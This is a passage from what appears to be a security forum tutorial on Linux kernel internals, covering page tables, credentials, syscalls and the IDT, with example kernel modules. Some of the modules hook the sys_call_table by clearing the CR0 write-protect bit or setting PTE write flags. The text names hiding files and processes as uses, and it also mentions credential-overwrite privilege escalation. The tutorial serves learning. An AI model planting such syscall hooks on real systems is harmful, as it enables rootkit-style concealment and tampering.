<p>If it isn’t enabled, it simply casts the <em>pgd_t *</em> as <em>p4d_t *</em> and returns it, otherwise it returns the <em>P4D entry</em> within the <em>PGD</em> that links to the <em>specific address</em>.<br>
Then <em>P4D</em> itself can be used to find the next level, which is <em>PUD</em> of type <em>pud_t *</em>, <em>PUD</em> links to <em>PMD</em>(<em>Page Middle Directory</em>) and <em>PMD</em> to the <em>PTE</em>(<em>Page Table Entry</em>) which is the last level, and contains the <em>physical address</em> of the <em>page</em> with some <em>protection flags</em> and is of type <em>pte_t *</em>.</p>
<p>Each <em>process</em> has it’s own <em>virtual space</em>(<em>mm_struct</em>, <em>vm_area_struct</em> and <em>pgd_t</em>).</p>
<pre><code class="lang-auto">struct vm_area_struct {

	unsigned long vm_start;
	unsigned long vm_end;

	struct vm_area_struct *vm_next, *vm_prev;

	struct rb_node vm_rb;


	unsigned long rb_subtree_gap;


	struct mm_struct *vm_mm;
	pgprot_t vm_page_prot;
	unsigned long vm_flags;	

	struct {
		struct rb_node rb;
		unsigned long rb_subtree_last;
	} shared;

	struct list_head anon_vma_chain;
	struct anon_vma *anon_vma;

	const struct vm_operations_struct *vm_ops;

	unsigned long vm_pgoff;
	struct file * vm_file;
	void * vm_private_data;

	atomic_long_t swap_readahead_info;
#ifndef CONFIG_MMU
	struct vm_region *vm_region;
#endif
#ifdef CONFIG_NUMA
	struct mempolicy *vm_policy;
#endif
	struct vm_userfaultfd_ctx vm_userfaultfd_ctx;
} __randomize_layout;
</code></pre>
<pre><code class="lang-auto">typedef struct { pgdval_t pgd; } pgd_t;
</code></pre>
<p>So creating a new process would be very expensive on performance. <em>Copy-on-Write</em>(<strong>COW</strong>) comes in helpful here, by making a clone out of the parent process and only copying when a write happens to the previously marked <em>read-only</em> pages.<br>
This happens on fork and more specifically in <em>copy_process()</em>, which duplicates the <em>task_struct</em> and does specific operations depending on flags passed to <em>clone()</em>, before copying all parent information which includes <em>credentials, filesystem, files, namespaces, IO, Thread Local Storage, signal, address space</em>.<br>
As an example, this walks <em>VMAs</em> in search of a user specified address, once found, it gets its <em>Physical address</em> and <em>Flags</em> by walking <em>page tables</em>.</p>
<pre><code class="lang-auto">#include &lt;linux/module.h&gt;
#include &lt;linux/kernel.h&gt;
#include &lt;linux/proc_fs.h&gt;
#include &lt;linux/sched.h&gt;
#include &lt;linux/uaccess.h&gt;
#include &lt;asm/pgtable.h&gt;
#include &lt;linux/highmem.h&gt;
#include &lt;linux/slab.h&gt;

#define device_name "useless"
#define SET_ADDRESS 0x00112233

char *us_buf;
unsigned long address = 0;

long do_ioctl(struct file *filp, unsigned int cmd, unsigned long arg){
	switch(cmd){
		case SET_ADDRESS:
			address = arg;
			return 0;
		default:
			return -EINVAL;
	}
}

ssize_t do_read(struct file *filp, char *buf, size_t count, loff_t *offp){
	int res, phys, flags;
	struct vm_area_struct *cmap;
	pgd_t *pgd;
	p4d_t *p4d;
	pud_t *pud;
	pmd_t *pmd;
	pte_t *ptep;

	/* Find corresponding VMA */
	cmap    = current-&gt;mm-&gt;mmap;

	while(1){
		if(cmap-&gt;vm_start &lt;= address &amp;&amp; address &lt; cmap-&gt;vm_end){
			break;
		}
		
		cmap     = cmap-&gt;vm_next;
		if(cmap  == NULL){
			return -1;
		}
	};
	
	/* Walking Page-tables for fun */
	pgd     = pgd_offset(current-&gt;mm, address);
	p4d     = p4d_offset(pgd,         address);
	pud     = pud_offset(p4d,         address);
	pmd     = pmd_offset(pud,         address);
	ptep    = pte_offset_kernel(pmd,  address);
	phys    = *((int *) ptep);
	flags   = phys &amp; 0xfff;
	phys   &amp;= ~0xfff;
	
	snprintf(us_buf, 64, "PhysAddr(%x) VMAStart(%lx) Flags(%x)", phys, cmap-&gt;vm_start, flags);

	if(count &gt; 64)
		count = 64;
	res = copy_to_user(buf, us_buf, count);
	return res;
}

struct file_operations fileops = {
					.owner = THIS_MODULE,
					.read  = do_read,
					.unlocked_ioctl = do_ioctl,
				 };

static int us_init(void){
	struct proc_dir_entry *res;

	us_buf = kmalloc(64, GFP_KERNEL);
	if(us_buf == NULL){
		printk(KERN_ERR "Couldn't reserve memory.");
		return -ENOMEM;
	}
	
	res = proc_create(device_name, 0, NULL, &amp;fileops);
	if(res == NULL){
		printk(KERN_ERR "Failed allocating a proc entry.");
		return -ENOMEM;
	}
	
	return 0;
}

static void us_exit(void){
	remove_proc_entry(device_name, NULL);
	kfree(us_buf);
}
MODULE_LICENSE("GPU");

module_init(us_init);
module_exit(us_exit);
</code></pre>
<p>To communicate with this <em>proc entry</em>, the following was written:</p>
<pre><code class="lang-auto">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/ioctl.h&gt;

#define device_path "/proc/useless"
#define SET_ADDRESS 0x00112233


void main(void){
	int fd;
	char *ok;
	char c[64];

	fd = open(device_path, O_RDONLY);
	
	ok = malloc(512);
	memcpy(ok, "Welp", sizeof(int ));
	
	ioctl(fd, SET_ADDRESS, ok);

	read(fd, c, sizeof( c));
	printf("%s\n", &amp;c);
}
</code></pre>
<p>This gives:<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/b/b9e3fe8913d8af36cf6f2efc72a61fb13064ef73.png" alt="image" data-base62-sha1="qwsO47pCKiLfvekFOpRV0YnwdjR" width="419" height="98"><br>
<em>0x867 in binary is: 100001100111.<br>
Present: 1 (The page is present)<br>
R/W: 1 (The page have both read and write permissions)<br>
U/S: 1 (The page can be accessed by the user and supervisor)<br>
00<br>
Accessed: 1 (Set if the page had been accessed)<br>
Dirty: 1 (Set if the page was written to since last writeback)<br>
0000</em></p>
<p>Note that necessary checks on validity of return values was ignored in this example, these could be performed with <em>p??_none()</em> and <em>p??_present()</em>, and multiple other things could have been done, such as playing with the <em>PFN</em> or <em>page</em> or reading from the <em>Physical Address</em> with <em>void __iomem *</em>, <em>ioremap()</em> and <em>memcpy_fromio()</em> or <em>struct page *</em> and <em>kmap()</em>.</p>
<p>Translating address from virtual to physical takes time, so caching is implemented using the <em>TLB</em>(<em>Translation Lookaside Buffer</em>) to improve the performance, hopefully that the next access is going to land a cache-hit and that’ll hand the <em>PTE</em> faster than a miss where a <em>memory access</em> is forced to happen to get it. The <em>TLB</em> flushes from time to another, an example would be after a <em>page fault</em> is raised and completed.</p>
<h5>Processes:</h5>
<p>The kernel sees each process as a <strong>struct task_struct</strong> which is a huge struct that contains many fields which we can’t cover entirely, some are used to guarantee the (almost) fair scheduling and some show the task’s state(if it’s either unrunnable, runnable or stopped), priority, the parent process, a linked list of children processes, the address space it holds, and many others.<br>
We are mainly interested in the <strong>const struct cred __rcu *cred;</strong> which holds the task’s credentials.</p>
<pre><code class="lang-auto">struct cred {
	atomic_t	usage;
#ifdef CONFIG_DEBUG_CREDENTIALS
	atomic_t	subscribers;
	void		*put_addr;
	unsigned	magic;
#define CRED_MAGIC	0x43736564
#define CRED_MAGIC_DEAD	0x44656144
#endif
	kuid_t		uid;
	kgid_t		gid;
	kuid_t		suid;
	kgid_t		sgid;
	kuid_t		euid;
	kgid_t		egid;
	kuid_t		fsuid;
	kgid_t		fsgid;
	unsigned	securebits;
	kernel_cap_t	cap_inheritable;
	kernel_cap_t	cap_permitted;
	kernel_cap_t	cap_effective;
	kernel_cap_t	cap_bset;
	kernel_cap_t	cap_ambient;
#ifdef CONFIG_KEYS
	unsigned char	jit_keyring;
	struct key __rcu *session_keyring;
	struct key	*process_keyring;
	struct key	*thread_keyring;
	struct key	*request_key_auth;
#endif
#ifdef CONFIG_SECURITY
	void		*security;
#endif
	struct user_struct *user;
	struct user_namespace *user_ns;
	struct group_info *group_info;
	struct rcu_head	rcu;
} __randomize_layout;
</code></pre>
<p>This struct holds Capabilities, ((effective) <em>user</em> and <em>group</em>) ID, keyrings, (for synchronization, <em>Read-Copy-Update</em>) RCU, (tracks the user’s <em>usage</em> of the system by keeping <strong>counts</strong>) user and (holds <em>U/G ID</em> and the <strong>privileges</strong> for them) user_ns.<br>
In order to better understand this structure, a simple <em>proc entry</em> was created which extracts the <em>task_struct</em> of the process that uses it(<strong>current</strong>) and reads the effective <em>UID</em> and <em>GID</em>.</p>
<pre><code class="lang-auto">#include &lt;linux/module.h&gt;
#include &lt;linux/kernel.h&gt;
#include &lt;linux/proc_fs.h&gt;
#include &lt;linux/sched.h&gt;
#include &lt;linux/uaccess.h&gt;
#include &lt;linux/cred.h&gt;
#include &lt;linux/uidgid.h&gt;

#define device_name "useless"
#define SD_PRIV     0x10071007

struct{
	kuid_t ceuid;
	kgid_t cegid;
	spinlock_t clock;
}us_cd;

long do_ioctl(struct file *filp, unsigned int cmd, unsigned long arg){
	int res;

	switch(cmd){
		case SD_PRIV:
			spin_lock(&amp;us_cd.clock);
			current_euid_egid(&amp;us_cd.ceuid, &amp;us_cd.cegid);
			spin_unlock(&amp;us_cd.clock);
			res = copy_to_user((void *)arg, &amp;us_cd, 8);
			return res;
		default:
			return -EINVAL;
	}
}

struct file_operations fileops = {
					.owner = THIS_MODULE,
					.unlocked_ioctl = do_ioctl,
				 };

static int us_init(void){
	struct proc_dir_entry *res;

	spin_lock_init(&amp;us_cd.clock);
	res = proc_create(device_name, 0, NULL, &amp;fileops);
	if(res == NULL){
		printk(KERN_ERR "Failed allocating a proc entry.");
		return -ENOMEM;
	}

	return 0;
}

static void us_exit(void){
	remove_proc_entry(device_name, NULL);
}
MODULE_LICENSE("GPU");

module_init(us_init);
module_exit(us_exit);
</code></pre>
<p>The initialization process starts by preparing the spinlock and creating a proc entry with a specified name <em>“useless”</em> and a file_operations struct containing only necessary <strong>owner</strong> and <strong>unlocked_ioctl</strong> entries.<br>
While the ioctl handler simply checks if the command passed was <em>SD_PRIV</em> to extract the <em>UID</em> and <em>GID</em> with a call to the <strong>current_euid_egid()</strong> macro which in turn calls <strong>current_cred()</strong> to extract the <em>current-&gt;cred</em>:</p>
<pre><code class="lang-auto">#define current_euid_egid(_euid, _egid)		\
do {						\
	const struct cred *__cred;		\
	__cred = current_cred();		\
	*(_euid) = __cred-&gt;euid;		\
	*(_egid) = __cred-&gt;egid;		\
} while(0)
</code></pre>
<pre><code class="lang-auto">#define current_cred() \
	rcu_dereference_protected(current-&gt;cred, 1)
</code></pre>
<p>Then, we create a <strong>tasktry.c</strong> to interract with the <em>/proc/useless</em>.</p>
<pre><code class="lang-auto">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/ioctl.h&gt;

#define device_path "/proc/useless"
#define SD_PRIV     0x10071007

struct{
	unsigned int uid;
	unsigned int gid;
}data;

void main(void){
	int fd;

	fd = open(device_path, O_RDONLY);
	ioctl(fd, SD_PRIV, &amp;data);

	printf("UID: %d GID: %d\n", data.uid, data.gid);
}
</code></pre>
<p>Two binaries are then created in <strong>/tmp</strong> directory, one which is compiled by root(<em>setuid</em> bit set) tasktry_root and the other by a normal user called tasktry_user.</p>
<pre><code class="lang-auto">root@Nwwz:~# cd /tmp
root@Nwwz:/tmp# gcc tasktry.c -o tasktry_root; chmod u+s tasktry_root
root@Nwwz:/tmp# cd /root/mod
root@Nwwz:~/mod# make
make -c /lib/modules/4.17.0/build M=/root/mod modules
make[1]: Entering directory '/usr/src/linux-4.17.2'
	CC [M]	/root/mod/task.o
	Building modules, stage 2.
	MODPOST 1 modules
	CC	/root/mod/task.mod.o
	LD [M] /root/mod/task.ko
make[1]: Leaving directory '/usr/src/linux-4.17.2'
root@Nwwz:~/mod# insmod task.ko
root@Nwwz:~/mod# su - user
user@Nwwz:~$ cd /tmp
user@Nwwz:/tmp$ gcc tasktry.c -o tasktry_user
user@Nwwz:/tmp$ ls
tasktry_user tasktry_root tasktry.c
user@Nwwz:/tmp$ ./tasktry_root
UID: 0 GID: 1000
user@Nwwz:/tmp$ ./tasktry_user
UID: 1000 GID: 1000
</code></pre>
<p>As you can see, the effective UID of <em>tasktry_root</em> is <em>0</em> making it own high privileges, so overwritting <em>effective creds</em> is one way to <em>privilege escalation</em>(<em>prepare_kernel_creds()</em> and <em>commit_creds()</em> are used for this <em>purpose in most exploits</em>, instead of getting the <em>stack base</em> and <em>overwritting it directly</em>.), another is to <em>change capabilities</em>.<br>
On <em>Windows</em>, one way to <em>escalate privileges</em> would be to steal the token of <em>System process</em>(<em>ID 4</em>) and assign it to the newly spawned <em>cmd.exe</em> after changing the <em>reference count</em>:<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/7/70b355b66ad1e4811c79244b98fe125e52c57375.png" alt="image" data-base62-sha1="g4ZHnS7f1r9sa9TBv5Hted3xpmR" width="690" height="269"></p>
<h5>Syscalls:</h5>
<p>Processes running in userspace can still communicate with the kernel, thanks to <em>syscalls</em>.<br>
Each syscall is defined as follows:</p>
<pre><code class="lang-auto">SYSCALL_DEFINE0(getpid)
{
	return task_tgid_vnr(current);
}
</code></pre>
<p>With multiple arguments:</p>
<pre><code class="lang-auto">SYSCALL_DEFINE3(lseek, unsigned int, fd, off_t, offset, unsigned int, whence)
{
	return ksys_lseek(fd, offset, whence);
}
</code></pre>
<p>So, in general:</p>
<pre><code class="lang-auto">SYSCALL_DEFINE[ARG_COUNT]([SYSCALL_NAME], [ARG_TYPE], [ARG_NAME]){
	/* Passing the argument to another function, for processing. */
	return call_me([ARG_NAME]);
}
</code></pre>
<p>Few tries aaand <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:">:</p>
<pre><code class="lang-auto">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;

int main(void){
	printf("ID: %d\n", getuid());
	
	return 0;
}
</code></pre>
<p>Running this sample with GDB and putting breakpoint on the x64 libc, we can see that it does set <em>EAX</em> register to <em>0x66</em>(<strong>syscall number on x64</strong>) before the <em>syscall</em> instruction.</p>
<pre><code class="lang-auto">(gdb) x/i $rip
=&gt; 0x555555554704 &lt;main+4&gt;:		callq 0x5555555545a0 &lt;getuid@plt&gt;
(gdb) x/x getuid
0x7ffff7af2f30 &lt;getuid&gt;: 		0x000066b8
(gdb) b* getuid
Breakpoint 2 at 0x7ffff7af2f30: file ../sysdeps/unix/syscall-template.S, line 65.
(gdb) c
Continuing.

Breakpoint 2, getuid () at ../sysdeps/unix/syscall-template.S:65
65		../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) disas $rip
Dump of assembler code for function getuid:
=&gt; 0x00007ffff7af2f30 &lt;+0&gt;:		mov		$0x66,%eax
   0x00007ffff7af2f35 &lt;+5&gt;:		syscall
   0x00007ffff7af2f37 &lt;+7&gt;:		retq
 End of assembler dump.
(gdb) shell
root@Nwwz:~# echo "g" &gt; /proc/sysrq-trigger
</code></pre>
<p>We can invoke a shell from <em>GDB</em> to force <em>SysRQ</em>, and see what this <em>offset</em> in the <em>kernel</em> links for:</p>
<pre><code class="lang-bash">[New Thread 756]
[New Thread 883]
[New Thread 885]

Thread 103 received signal SIGTRAP, Trace/breakpoint trap.
[Switching to Thread 889]
kgdb_breakpoint () at kernel/debug/debug_core.c:1073
10733			wmb(); /* Sync point after breakpoint */
(gdb) p &amp;sys_call_table
$1 = (const sys_call_ptr_t (*)[]) 0xffffffff81c00160 &lt;sys_call_table&gt;
(gdb) x/gx (void *)$1 + 0x66*8
0xffffffff81c00490 &lt;sys_call_table+816&gt;:	0xffffffff8108ec60
(gdb) x/i 0xffffffff8108ec60
0xffffffff8108ec60 &lt;__x64_sys_getuid&gt;:		nopl	0x0(%rax,%rax,1)
</code></pre>
<p>So, it’s the global <strong>sys_call_table</strong>, indexing the <em>__x64_sys_getuid</em> there.</p>
<pre><code class="lang-auto">"The __x64_sys_*() stubs are created on-the-fly for sys_*() system calls"
is written in syscall_64.tbl that contains all the syscalls
available to the kernel.
</code></pre>
<p>This is similiar to the <em>nt!KiServiceTable</em> on Windows.</p>
<pre><code class="lang-auto">kd&gt; dps nt!KeServiceDescriptorTable
82b759c0  82a89d9c nt!KiServiceTable
82b759c4  00000000
82b759c8  00000191
82b759cc  82a8a3e4 nt!KiArgumentTable
82b759d0  00000000
82b759d4  00000000
kd&gt; dd nt!KiServiceTable
82a89d9c  82c85c28 82acc40d 82c15b68 82a3088a
82a89dac  82c874ff 82b093fa 82cf7b05 82cf7b4e
82a89dbc  82c0a3bd 82d11368 82d125c1 82c00b95
kd&gt; ln 82c85c28
(82c85c28)   nt!NtAcceptConnectPort   |  (82c85ca5)   nt!EtwpRundownNotifications
Exact matches:
    nt!NtAcceptConnectPort = &lt;no type information&gt;
kd&gt; ln 82acc40d 
(82acc40d)   nt!NtAccessCheck   |  (82acc43e)   nt!PsGetThreadId
Exact matches:
    nt!NtAccessCheck = &lt;no type information&gt;
kd&gt; ln 82d125c1
(82d125c1)   nt!NtAddDriverEntry   |  (82d125f3)   nt!NtDeleteDriverEntry
Exact matches:
    nt!NtAddDriverEntry = &lt;no type information&gt;
</code></pre>
<p>Dissasembling it gives us:</p>
<pre><code class="lang-auto">(gdb) disas __x64_sys_getuid
Dump of assembler code for function __x64_sys_getuid:
	0xffffffff8108ec60 &lt;+0&gt;:	nopl	0x0(%rax,%rax,1)
	0xffffffff8108ec65 &lt;+5&gt;:	mov		%gs:0x15c00,%rax
	0xffffffff8108ec6e &lt;+14&gt;:	mov		0x668(%rax),%rax
	0xffffffff8108ec75 &lt;+21&gt;:	mov		0x4(%rax),%esi
	0xffffffff8108ec78 &lt;+24&gt;:	mov		0x88(%rax),%rdi
	0xffffffff8108ec7f &lt;+31&gt;:	callq	0xffffffff8112d4a0 &lt;from_kuid_munged&gt;
	0xffffffff8108ec84 &lt;+36&gt;:	mov		%eax,%eax
	0xffffffff8108ec86 &lt;+38&gt;:	retq
</code></pre>
<p>With a basic understanding of ASM and a very limited knowledge of the kernel <em>(AT&amp;T haha, too lazy to switch the syntax <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:">.)</em>, one can know that it does first search for the <em>current</em> task, store some pointer it holds at offset <em>0x668</em> at RAX before dereferencing it again and using content at +0x88(<em>RDI</em>) and +0x4(<em>RSI</em>) as arguments to the <strong>from_kuid_munged</strong> call before it nops and returns(<em>q there stands for qword</em>).<br>
We can verify this either by <em>looking at the source</em>:</p>
<pre><code class="lang-auto">SYSCALL_DEFINE0(getuid)
{
	return from_kuid_munged(current_user_ns(), current_uid());
}
</code></pre>
<pre><code class="lang-auto">uid_t from_kuid_munged(struct user_namespace *targ, kuid_t kuid)
{
	uid_t uid;
	uid = from_kuid(targ, kuid);

	if (uid == (uid_t) -1)
		uid = overflowuid;
	return uid;
}
EXPORT_SYMBOL(from_kuid_munged);
</code></pre>
<p>Or checking in <em>GDB</em>(<em>maybe both?</em>):</p>
<pre><code class="lang-auto">(gdb) b* __x64_sys_getuid
Breakpoint 1 at 0xffffffff8108ec60: file kernel/sys.c, line 920.
(gdb) c
[New Thread 938]
[Switching to Thread 938]

Thread 122 hit Breakpoint 1, __x64_sys_getuid () at kernel/sys.c:920
920		{
(gdb) ni
get_current () at ./arch/x86/include/asm/current.h:15
15		return this_cpu_read_stable(current_task);
(gdb) x/i $rip
=&gt; 0xffffffff8108ec65 &lt;__x64_sys_getuid+5&gt;:		mov		%gs:0x15c00,%rax
(gdb) p ((struct task_struct *)0)-&gt;cred
Cannot access memory at address 0x668
(gdb) p ((struct cred *)0)-&gt;uid
Cannot access memory at address 0x4
(gdb) p ((struct cred *)0)-&gt;user_ns
Cannot access memory at address 0x88
</code></pre>
<p>The sys_call_table is residing in a RO(<em>read only</em>) memory space:</p>
<pre><code class="lang-bash">(gdb) x/x sys_call_table
0xffffffff81c00160 &lt;sys_call_table&gt;:	0xffffffff81247310
(gdb) maintenance info sections
...
 [3]	0xffffffff81c00000-&gt;0xffffffff81ec1a42 at 0x00e00000: .rodata ALLOC LOAD RELOC DATA HAS_CONTENTS
...
(gdb) 
</code></pre>
<p>But a kernel module can overcome this protection and place a hook at any <em>systemcall</em>.<br>
For that, two example modules will be given:<br>
<strong>=] Disabling the previously discussed WP(<em>write-protect</em>) bit in the CR0(<em>control register <span class="hashtag">#0</span></em>), using <em>read_cr0</em> and <em>write_cr0</em> to acheive that.</strong></p>
<pre><code class="lang-auto">#include &lt;linux/fs.h&gt;
#include &lt;asm/pgtable.h&gt;
#include &lt;linux/module.h&gt;
#include &lt;linux/kernel.h&gt;
#include &lt;linux/uaccess.h&gt;
#include &lt;linux/kallsyms.h&gt;
#include &lt;linux/miscdevice.h&gt;
#include &lt;asm/special_insns.h&gt;

#define device_name "hookcontrol"
#define ioctl_base    0x005ec
#define ioctl_enable  ioctl_base+1
#define ioctl_disable ioctl_base+2

int    res;
int  (*real_getuid)(void);
void **sys_call_table;
unsigned long const *address;

static int hooked_getuid(void){
	printk(KERN_INFO "Received getuid call from %s!", current-&gt;comm);
	if(real_getuid != NULL){
		return real_getuid();
	}
	
	return 0;
}

long do_ioctl(struct file *filp, unsigned int cmd, unsigned long arg){
	unsigned long cr0 = read_cr0();

	switch(cmd){
		case ioctl_enable:
		printk(KERN_INFO "Enabling hook!");
		write_cr0(cr0 &amp; ~0x10000);
		sys_call_table[__NR_getuid] = hooked_getuid;
		write_cr0(cr0 |  0x10000);
		printk(KERN_INFO "Successfully changed!");

		return 0;
		case ioctl_disable:
		printk(KERN_INFO "Disabling hook!");
		write_cr0(cr0 &amp; ~0x10000);
		sys_call_table[__NR_getuid] = real_getuid;
		write_cr0(cr0 |  0x10000);
		printk(KERN_INFO "Successfully restored!");
		
		return 0;
		default:
		return -EINVAL;
	}
}

struct file_operations file_ops = {
									.owner          = THIS_MODULE,
									.unlocked_ioctl = do_ioctl
								  };

struct miscdevice hk_dev = {
							MISC_DYNAMIC_MINOR,
							device_name,
							&amp;file_ops
						   };

static int us_init(void){
	res = misc_register(&amp;hk_dev);
	if(res){
		printk(KERN_ERR "Couldn't load module!");
		return -1;
	}
	
	sys_call_table = (void *) kallsyms_lookup_name("sys_call_table");
	real_getuid    = sys_call_table[__NR_getuid];
	address        = (unsigned long *) &amp;sys_call_table;
	printk(KERN_INFO "Module successfully loaded with minor: %d!", hk_dev.minor);
	return 0;
}

static void us_exit(void){
	misc_deregister(&amp;hk_dev);
}
MODULE_LICENSE("GPL");

module_init(us_init);
module_exit(us_exit);
</code></pre>
<p><strong>=] <em>Orr</em>’ing the protection mask of the page at which it resides(<em>__pgprot(_PAGE_RW)</em>)( <em>set_memory_rw()</em> &amp; <em>set_memory_rw()</em>), or directly modifying the <em>PTE</em>.</strong></p>
<pre><code class="lang-auto">static inline pte_t pte_mkwrite(pte_t pte)
{
	return pte_set_flags(pte, _PAGE_RW);
}

static inline pte_t pte_wrprotect(pte_t pte)
{
	return pte_clear_flags(pte, _PAGE_RW);
}
</code></pre>
<p>Looking at these functions, one can safely assume that manipulation can be acheived with simple OR and AND(<em>_PAGE_RW</em>) operations on the <em>pte_t</em>.</p>
<pre><code class="lang-auto">pte_t *lookup_address(unsigned long address, unsigned int *level)
{
	return lookup_address_in_pgd(pgd_offset_k(address), address, level);
}
</code></pre>
<p>Since it’s a kernel address, <em>pgd_offset_k()</em> is called, which makes use of <strong>&amp;init_mm</strong>, instead of a mm_struct belonging to some process of <em>one’s choice</em>.</p>
<pre><code class="lang-auto">pte_t *lookup_address_in_pgd(pgd_t *pgd, unsigned long address,
			     unsigned int *level)
{
	p4d_t *p4d;
	pud_t *pud;
	pmd_t *pmd;

	*level = PG_LEVEL_NONE;

	if (pgd_none(*pgd))
		return NULL;

	p4d = p4d_offset(pgd, address);
	if (p4d_none(*p4d))
		return NULL;

	*level = PG_LEVEL_512G;
	if (p4d_large(*p4d) || !p4d_present(*p4d))
		return (pte_t *)p4d;

	pud = pud_offset(p4d, address);
	if (pud_none(*pud))
		return NULL;

	*level = PG_LEVEL_1G;
	if (pud_large(*pud) || !pud_present(*pud))
		return (pte_t *)pud;

	pmd = pmd_offset(pud, address);
	if (pmd_none(*pmd))
		return NULL;

	*level = PG_LEVEL_2M;
	if (pmd_large(*pmd) || !pmd_present(*pmd))
		return (pte_t *)pmd;

	*level = PG_LEVEL_4K;

	return pte_offset_kernel(pmd, address);
}
</code></pre>
<p>so, the <em>ioctl</em> handler looks like this:</p>
<pre><code class="lang-auto">long do_ioctl(struct file *filp, unsigned int cmd, unsigned long arg){
	unsigned int level;
	pte_t *pte = lookup_address(*address, &amp;level);;

	switch(cmd){
		case ioctl_enable:
		printk(KERN_INFO "Enabling hook!");
		pte-&gt;pte |= _PAGE_RW;
		sys_call_table[__NR_getuid] = hooked_getuid;
		pte-&gt;pte &amp;= ~_PAGE_RW;
		printk(KERN_INFO "Successfully changed!");

		return 0;
		case ioctl_disable:
		printk(KERN_INFO "Disabling hook!");
		pte-&gt;pte |= _PAGE_RW;
		sys_call_table[__NR_getuid] = real_getuid;
		pte-&gt;pte &amp;= ~_PAGE_RW;
		printk(KERN_INFO "Successfully restored!");
		
		return 0;
		default:
		return -EINVAL;
	}
}
</code></pre>
<p>(Know that these are only <em>examples</em>, <strong>usually</strong>, <em>replacing</em> should take place at <em>init</em> and <em>restoring the original</em> at <em>exit</em>, plus the definition of both the <em>hook</em> and <em>original</em> handlers, should hold <em>asmlinkage</em>(passing <em>arguments</em> in <em>stack</em>, unlike <em>fastcall</em>(<em>default</em>) in <em>registers</em>), however, since the syscall here holds no <em>arguments</em>, this was <em>ignored</em>.)<br>
By running an application from user-space to interact with <strong>/dev/hookcontrol</strong>: (<em>enabling and disabling after a while</em>) and taking a look at <em>dmesg</em>:<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/1/18a67ac77e14a1f3d4f58460bd0ad0593364eaa4.png" alt="image" data-base62-sha1="3w48GWeMaYiIqdgRYJRrBDKcYCw" width="377" height="307"><br>
This can be used to provide a layer on the syscall, prevent or manipulate the return value, like <em>kill</em> to prevent a process from being <em>killed</em>, <em>getdents</em> to <em>hide</em> some files, <em>unlink</em> to prevent a file from being <em>deleted</em>, et cetera…<br>
And it doesn’t stop here, even without <em>syscall hooking</em>, one can play with processes(<em>hide them as an example…</em>) with <em>task_struct elements</em> and <em>per-task flags</em>, or change the <em>file_operations</em> in some <em>specific struct</em>, and <strong>many</strong> other possibilities.</p>
<h5>IDT(Interrupt Descriptor Table):</h5>
<p>In order to handle <em>exceptions</em>, this <em>table</em> exists, by linking a <em>specific handler</em> to each exception, it helps deal with those raised from <em>userspace</em>(<em>a translation to ring zero is required first</em>) and <em>kernelspace</em>.<br>
It first is initialized during early setup, and this can be seen in <em>setup_arch()</em> which calls multiple functions, some to setup the <em>IDT</em>, most important to us is <em>idt_setup_traps()</em>:</p>
<pre><code class="lang-auto">void __init idt_setup_traps(void)
{
	idt_setup_from_table(idt_table, def_idts, ARRAY_SIZE(def_idts), true);
}
</code></pre>
<p>It makes use of the <em>default IDT</em>s array(<em>def_idts</em>).</p>
<pre><code class="lang-auto">static const __initconst struct idt_data def_idts[] = {
	INTG(X86_TRAP_DE,		divide_error),
	INTG(X86_TRAP_NMI,		nmi),
	INTG(X86_TRAP_BR,		bounds),
	INTG(X86_TRAP_UD,		invalid_op),
	INTG(X86_TRAP_NM,		device_not_available),
	INTG(X86_TRAP_OLD_MF,		coprocessor_segment_overrun),
	INTG(X86_TRAP_TS,		invalid_TSS),
	INTG(X86_TRAP_NP,		segment_not_present),
	INTG(X86_TRAP_SS,		stack_segment),
	INTG(X86_TRAP_GP,		general_protection),
	INTG(X86_TRAP_SPURIOUS,		spurious_interrupt_bug),
	INTG(X86_TRAP_MF,		coprocessor_error),
	INTG(X86_TRAP_AC,		alignment_check),
	INTG(X86_TRAP_XF,		simd_coprocessor_error),

#ifdef CONFIG_X86_32
	TSKG(X86_TRAP_DF,		GDT_ENTRY_DOUBLEFAULT_TSS),
#else
	INTG(X86_TRAP_DF,		double_fault),
#endif
	INTG(X86_TRAP_DB,		debug),

#ifdef CONFIG_X86_MCE
	INTG(X86_TRAP_MC,		&amp;machine_check),
#endif

	SYSG(X86_TRAP_OF,		overflow),
#if defined(CONFIG_IA32_EMULATION)
	SYSG(IA32_SYSCALL_VECTOR,	entry_INT80_compat),
#elif defined(CONFIG_X86_32)
	SYSG(IA32_SYSCALL_VECTOR,	entry_INT80_32),
#endif
};
</code></pre>
<p>On <em>x86_32</em> as an example, when an <em>int 0x80</em> is raised. the following happens:</p>
<pre><code class="lang-auto">static __always_inline void do_syscall_32_irqs_on(struct pt_regs *regs)
{
	struct thread_info *ti = current_thread_info();
	unsigned int nr = (unsigned int)regs-&gt;orig_ax;

#ifdef CONFIG_IA32_EMULATION
	ti-&gt;status |= TS_COMPAT;
#endif

	if (READ_ONCE(ti-&gt;flags) &amp; _TIF_WORK_SYSCALL_ENTRY) {
	
		nr = syscall_trace_enter(regs);
	}

	if (likely(nr &lt; IA32_NR_syscalls)) {
		nr = array_index_nospec(nr, IA32_NR_syscalls);
#ifdef CONFIG_IA32_EMULATION
		regs-&gt;ax = ia32_sys_call_table[nr](regs);
#else

		regs-&gt;ax = ia32_sys_call_table[nr](
			(unsigned int)regs-&gt;bx, (unsigned int)regs-&gt;cx,
			(unsigned int)regs-&gt;dx, (unsigned int)regs-&gt;si,
			(unsigned int)regs-&gt;di, (unsigned int)regs-&gt;bp);
#endif
	}

	syscall_return_slowpath(regs);
}

__visible void do_int80_syscall_32(struct pt_regs *regs)
{
	enter_from_user_mode();
	local_irq_enable();
	do_syscall_32_irqs_on(regs);
}
</code></pre>
